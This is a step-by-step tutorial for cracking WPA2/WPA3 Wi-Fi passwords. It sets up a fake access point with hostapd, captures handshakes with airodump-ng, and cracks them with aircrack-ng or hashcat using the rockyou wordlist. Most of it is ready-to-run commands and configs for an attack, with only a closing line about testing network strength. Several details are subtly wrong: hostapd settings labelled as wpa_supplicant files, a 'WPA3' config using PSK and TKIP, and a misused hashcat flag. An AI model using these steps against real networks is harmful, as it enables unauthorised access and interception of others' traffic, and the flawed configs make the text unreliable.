## Cracking WPA2/WPA3 Passwords Using a Fake Access Point[](#cracking-wpa2-wpa3-passwords-using-a-fake-access-point)

In this tutorial, we'll demonstrate how to set up a fake access point (AP), capture WPA2/WPA3 handshakes, and crack the passwords using tools like aircrack-ng and hashcat. We will also configure the AP to use WPA2 or WPA3 encryption.

Prerequisites

Ensure you have the following:

A wireless card that supports monitor mode.

The necessary tools: airmon-ng, airodump-ng, hostapd, aircrack-ng, hashcat, hcxpcapngtool, and a wordlist (e.g., /usr/share/wordlists/rockyou.txt).

Step-by-Step Process

1. Start Interface in Monitor Mode and Kill Unwanted Services

Start by disabling any services that might interfere with your network scanning, then put your wireless interface into monitor mode:

```bash
airmon-ng check kill && airmon-ng start wlan0
```

`airmon-ng check kill`: Stops interfering processes.

`airmon-ng start wlan0`: Puts the wireless interface wlan0 into monitor mode (wlan0mon).

#### 2. **Scan for Networks**[](#id-2.-scan-for-networks)

Next, scan for nearby wireless networks and capture data about them:

```bash
sudo airodump-ng wlan0mon -w capture1
```

- `airodump-ng`: Scans for nearby networks.
- `-w capture1`: Saves the capture data into a file named `capture1.cap`.

This command will display a list of nearby networks, and we will use this data to create a fake access point.

#### 3. **Create AP Based on Network Probes**[](#id-3.-create-ap-based-on-network-probes)

Using the data from the captured networks, create a `wpa_supplicant` configuration file to set up your fake AP. You can use either WPA2 or WPA3 configurations:

**Create your WPA Supplicant file:**

### We're creating the files

```bash
touch wpa2.conf wpa3.conf
```

WPA2 Configuration:

```bash
	network{
	interface=wlan1 #the other wireless interface available to us
	hw_mode=g
	channel=1
	driver=nl80211 #as used by all Linux OSs
	ssid=Name #name of the network
	auth_algs=1
	wpa=2
	wpa_key_mgmt=WPA-PSK
	wpa_passphrase=abc123123 #can be anything, but ensure it is minimum 8 in length
}
```

WPA3 Configuration:

```bash
network{
	interface=wlan0
	ssid=Mostar
	channel=1
	hw_mode=g
	ieee80211n=1
	wpa=3
	wpa_key_mgmt=WPA-PSK
	wpa_passphrase=ANYPASSWORD
	wpa_pairwise=TKIP
	rsn_pairwise=TKIP CCMP
	mana_wpaout=/home/kali/file.hccapx
}
```

#### 4. **Start the Fake Access Point**[](#id-4.-start-the-fake-access-point)

Use `hostapd` to start the fake access point with the configuration file you created:

```bash
hostapd -d <filename>.conf
```

- Replace `<filename>` with the name of the configuration file you created.

Once the AP is started, the handshake should be captured on the `airodump-ng` screen.

#### 5. **Crack the Captured Handshake**[](#id-5.-crack-the-captured-handshake)

After capturing the handshake, you can attempt to crack the password using `aircrack-ng` or `hashcat`.

**Cracking with aircrack-ng:**

```bash
sudo aircrack-ng <output_file>.cap -e <ESSID>
```

```bash
sudo aircrack-ng <output_file>.cap -e <ESSID> -w /usr/share/wordlists/rockyou.txt
```

- `<output_file>.cap`: The capture file containing the handshake.
- `<ESSID>`: The SSID of the target network.
- `-w /usr/share/wordlists/rockyou.txt`: Specifies the wordlist to use for the dictionary attack.

**Cracking with hashcat:**

Convert the capture file to the hashcat format:
```bash
    hcxpcapngtool -o <output_file>.hc22000 <output_file>.cap
```

Run hashcat to crack the password:
```bash
hashcat -m 22000 <output_file>.hc22000 -w /usr/share/wordlists/rockyou.txt
```

- `-m 22000`: Specifies the hash type (WPA/WPA2).
- `<output_file>.hc22000`: The converted file in hashcat format.

### Connect to the Wireless Network:[](#connect-to-the-wireless-network)

```bash
wpa_supplicant -c wpa.conf -i wlan0mon
```

Then open another terminal and request ip from the DHCP server:

```bash
sudo dhclient wlan0 -v
```

#### 6. **Conclusion**[](#id-6.-conclusion)

After following these steps, you've successfully set up a fake access point, captured a WPA2/WPA3 handshake, and cracked the password using `aircrack-ng` or `hashcat`. These methods simulate real-world attacks to test the strength of wireless networks.
